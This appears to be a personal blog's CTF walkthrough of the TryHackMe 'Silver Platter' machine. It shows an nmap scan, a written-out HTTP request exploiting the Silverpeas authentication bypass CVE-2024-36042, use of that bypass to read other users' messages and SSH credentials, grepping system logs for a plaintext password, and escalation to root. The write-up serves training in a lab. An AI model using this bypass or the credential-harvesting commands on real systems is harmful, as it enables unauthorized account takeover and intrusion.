---
layout: post
title: Silver Platter
date: 2025-05-26 10:00:00 +0100
categories: [Walkthroughs]
tags: [tryhackme, linux, CVE, privesc]
---
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Silver%20Platter%20logo%20(Custom).png?raw=true)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | TryHackMe       |
| OS | Linux        |
| Difficulty | Easy        |
| Release Date | 10 January 2025        |
| Link to machine | [SilverPlatter](https://tryhackme.com/room/silverplatter)        |

# Highlights
HTTP enumeration, OSINT, Burp Suite, XSS, Linux Privilege Escalation

---

# Open ports enumeration
Lets start by starting an nmap scan

```bash
nmap -T4 -p- -A 10.10.150.111
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 15:38 BST
Nmap scan report for 10.10.150.111
Host is up (0.023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Mon, 26 May 2025 14:38:39 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=5/26%Time=68347CEF%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r
SF:\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mon,\
SF:x2026\x20May\x202025\x2014:38:39\x20GMT\r\n\r\n<html><head><title>Error
SF:</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTPOpt
SF:ions,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nCo
SF:ntent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mon,\x202
SF:6\x20May\x202025\x2014:38:39\x20GMT\r\n\r\n<html><head><title>Error</ti
SF:tle></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPRequest
SF:,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\x20
SF:Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nConten
SF:t-Type:\x20text/html\r\nDate:\x20Mon,\x2026\x20May\x202025\x2014:38:39\
SF:x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\x20
SF:Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Gener
SF:icLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\
SF:r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x
SF:200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20
SF:close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,42
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPDStr
SF:ing,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
SF:onnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n");
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   31.17 ms 10.14.0.1
2   24.79 ms 10.10.150.111

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.27 second
```

Nmap returns open ports for SSH (Port 22), a web server(HTTP) on port 80 and one on port 8080. 

Let's start the enumeration from  ```HTTP (Port 80)``` after adding the machine name to our /etc/hosts/ file. The name is shown on the TryHackMe page after launching the machine, in this case, the name is SilverPlatter3
# HTTP Enumeration

Visiting the website, the only interesting page is http://silverplatter3/#contact.
This page shows us the name of a user "scr1ptkiddy", as well as something called "Silverpeas"

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/SilverPlatterContact1.png?raw=true)
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/SilverPlatterContact2.png?raw=true)

So let's do some ```OSINT``` (Open Source Intelligence) on Silverpeas

# Silverpeas OSINT Findings

We find the official website of Silverpeas, and the description of the application is:

```Use Silverpeas to build an Intranet or Extranet and feed web 2.0 sites optimizing sharing and performance.
Based on it's collaborative bus, Silverpeas is used to share documents (EDM for Electronic Documentation Management), to optimize project managment, content management and knowledge and skills management.
Silverpeas improves and encourages best practices and helps the creation of social networks, thanks to improved workflow and information management.```

We find the instructions for installation and, at the end of the page, some interesting information:
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Silverpeas1.png?raw=true)
So we attempt the login at http://silverplatter3:8080/silverpeas/, as our host does not have port 8000 open but 8080 is.
Unfortunately the default credentials do not give us access, but we still have the username ```scr1ptkiddy``` that we found on the ```contact``` page, without a password.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/SilverPeas2.png?raw=true)

# Burp Suite Enumeration
Burp Suite is the industry standard tool for web application hacking, among all its functionality, is capable of intercepting web requests, so they can be analyzed.
TryHackMe has some very good modules on learning how to use Burp Suite, they can be found [here](https://tryhackme.com/module/learn-burp-suite), but it requires a subscription (100% worth it).

Once Burp Suite is setup to intercept the traffic we type the username ```scr1ptkiddy``` in the username tab on the website and ```test``` in the password tab, and click on ```LOG IN```. Burp Suite will intercept the request and show us the result:

the application sends a POST request to ```/silverpeas/AuthenticationServlet``` and assigns a ```JSESSIONID``` cookie to the user

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/BurpSuite1.png?raw=true)

Doing some further research on Silverpeas vulnerabilities, we come across ```CVE-2024-36042``` [here](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d)
CVE is a program that assigns unique identifiers to publicly discosed cybersecurity vulnerabilities. If published on github, they often come with a ```POC```(proof of concept) so that the exploit can be replicated.

```CVE-2024-36042``` states that Silverpeas versions up to 6.3.4 is vulnerable to authentication bypass if the password form field is omitted.
We have not had confirmation of the Silverpeas version in us, but being a CTF, is highly possible that the version in use by the box is vulnerable to this exploit.

# Exploit and Foothold

We sent the request to ```Repeater``` in Burp Suite, remove the password and cookie fields, and sent the request to the application.
The final request should look like this:

```bash
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: silverplatter3:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://silverplatter3:8080
Connection: keep-alive
Referer: http://silverplatter3:8080/silverpeas/defaultLogin.jsp
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Login=scr1ptkiddy&DomainId=0
```
The response we receive should look like:

```bash
HTTP/1.1 302 Found
Set-Cookie: JSESSIONID=22D2G3E6r8plc-G5ybnP1s58gf5AXfX-p53cwMn1.ebabc79c6d2a; path=/silverpeas; HttpOnly
Set-Cookie: defaultDomain=0; path=/; Max-Age=31536000; Expires=Tue, 26-May-2026 15:18:20 GMT
Set-Cookie: svpLogin=scr1ptkiddy; path=/; Max-Age=31536000; Expires=Tue, 26-May-2026 15:18:20 GMT
X-XSS-Protection: 1
x-ua-compatible: ie=edge
X-Frame-Options: SAMEORIGIN
Location: http://silverplatter3:8080/silverpeas/Main//look/jsp/MainFrame.jsp
Content-Security-Policy: default-src 'self' blob: mailto:  https: spwebdav:  ws://silverplatter3:8080 ; script-src 'self' blob: 'unsafe-inline' 'unsafe-eval'  https: spwebdav: https://apis.google.com; style-src 'self' 'unsafe-inline'  https: spwebdav: https://fonts.googleapis.com; style-src-elem 'self' blob: 'unsafe-inline' https://fonts.googleapis.com
Date: Mon, 26 May 2025 15:18:20 GMT
Connection: keep-alive
Access-Control-Allow-Origin: http://silverplatter3:8080
X-Content-Type-Options: nosniff
Content-Length: 0
```
The response contains a ```JSESSIONID``` cookie and a ```Location```.
Adding the cookie to our browser using Cookie-Editor extension, allows us to navigate to the ```Location``` ```http://silverplatter3:8080/silverpeas/Main//look/jsp/MainFrame.jsp```, and we are in!
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/SilverPlatterLogin.png?raw=true)

There is an unread notification, and by opening it we see that a user called ```Manager Manager``` has send a message to our user ```scr1ptkiddy```, mentioning a user called ```tyler```

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/ManagerMessage.png?raw=true)

The Silverpeas application has a messaging feature, so opening the window as if we were to message another user, we can find an icon that allow us to see what other users are available

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/MessageTab1.png?raw=true)

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/MessageTab2.png?raw=true)

We can try the same exploit as before, with a different user, for example ```Manager```

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/BurpSuite2.png?raw=true)

Repeating the steps from the first exploit, we change the ```JSESSIONID``` cookie in our browser and navigate again to ```http://silverplatter3:8080/silverpeas/look/jsp/MainFrame.jsp```
We are presented with the same homepage for the first user, but this time we are logged in as ```Manager Manager```
Opening the unread messages, we find a message from ```Administrator``` that contains what looks like ```SSH``` credentials for a user called ```tim```

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/ManagerLogin.png?raw=true)

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/SSH.png?raw=true)

We know that ```SSH``` is open, so we can test the credentials found.

# SSH as tim

```bash
ssh tim@SilverPlatter3

tim@silver-platter:~$ whoami
tim
tim@silver-platter:~$ hostname
silver-platter
tim@silver-platter:~$ 
tim@silver-platter:~$ ls
user.txt
```
The credentials do work, and we can confirm we are logged in to silver-platter as the user tim. We can collect our ```user flag``` and move onto enumeration of the machine.

```bash
tim@silver-platter:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
tyler:x:1000:1000:root:/home/tyler:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
tim:x:1001:1001::/home/tim:/bin/bash
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```

Using the command ```cat /etc/passwd``` allows us to see all users available on the machine, and confirm that ```tyler``` is one of them.
Looking for easy wins, we use the command ```grep -ir "password" /var/log```
This command searches recursively (-r) and case-insensitively (-i) for the word "password" in all files inside the ```/var/log``` directory and its subdirectories.

The output is pretty long, but analyzing with some patience, we find an interesting line
```bash
/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd******** -v postgresql-data:/var/lib/postgresql/data postgres:12.3
```
There is a plaintext password saved in the logs, the line mentions the user ```tyler``` which we know is our target, so we attempt to pivot to ```tyler``` with the new credentials.

```bash
tim@silver-platter:~$ su tyler
Password: 
tyler@silver-platter:/home/tim$ 
```
Bingo!

Enumerating privileges,we find out that this is a quick win, as the the user tyler is allowed to run any command on the box as root (ALL : ALL) , knowing the password, we can simply set a new password for the user root, and then escalate privileges.

```bash
tyler@silver-platter:/home/tim$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```

```bash
tyler@silver-platter:/home/tim$ sudo passwd root
New password: 
Retype new password: 
passwd: password updated successfully
tyler@silver-platter:/home/tim$ su root
Password: 
root@silver-platter:/home/tim# 
root@silver-platter:/home/tim# whoami
root
root@silver-platter:~# cd ../home/tim
root@silver-platter:/home/tim# cd ../../root
root@silver-platter:~# ls
root.txt  snap  start_docker_containers.sh
root@silver-platter:~# 
```

Now navigate to the root directory and collect your ```root.txt``` flag !

---

The path shown in this post, was not the intended path of the creator, Tyler Ramsbey.
I am sharing this as in many CTFs it will happen that unintended paths will be discovered, thinking outside the box might take you through an unaxpected route, that can either be more difficult, or like in this case much easier.
If you are interested in the inteded path, you can check out Tyler's walkthrough on Youtube at this link [Silver Platter](https://www.youtube.com/watch?v=RMer10J97-0&t=1402s).